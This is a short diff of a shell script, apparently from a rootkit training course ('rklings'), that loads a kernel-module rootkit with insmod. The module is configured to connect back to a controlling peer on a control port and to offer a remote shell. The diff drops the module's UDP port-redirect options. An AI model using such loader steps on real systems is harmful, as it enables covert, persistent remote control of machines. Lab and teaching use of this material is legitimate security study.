@@ -25,7 +25,6 @@ run()
 ui_heading 'Completed course rootkit'
 ui_field 'Control' "$peer:$control_port"
 ui_field 'Shell' "$peer:$shell_port"
-ui_field 'UDP' '127.0.0.1:5400 -> 127.0.0.1:5401'
 
 run mkdir -p /etc/modules-load.d
 run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
@@ -43,7 +42,6 @@ command='insmod /rklings/rklings.ko'
 command="$command peer_address=$peer peer_port=$control_port"
 command="$command retry_base_ms=25 retry_max_ms=200"
 command="$command control_key=<redacted> shell_timeout_ms=300000"
-command="$command redirect_from_port=5400 redirect_to_port=5401"
 show "$command"
 insmod /rklings/rklings.ko \
 	"peer_address=$peer" \
@@ -51,9 +49,7 @@ insmod /rklings/rklings.ko \
 	retry_base_ms=25 \
 	retry_max_ms=200 \
 	"control_key=$key" \
-	shell_timeout_ms=300000 \
-	redirect_from_port=5400 \
-	redirect_to_port=5401
+	shell_timeout_ms=300000
 
 ui_success 'Complete rootkit loaded with actions disabled'
 ui_progress 'Use the host operator prompt to inspect and control it'
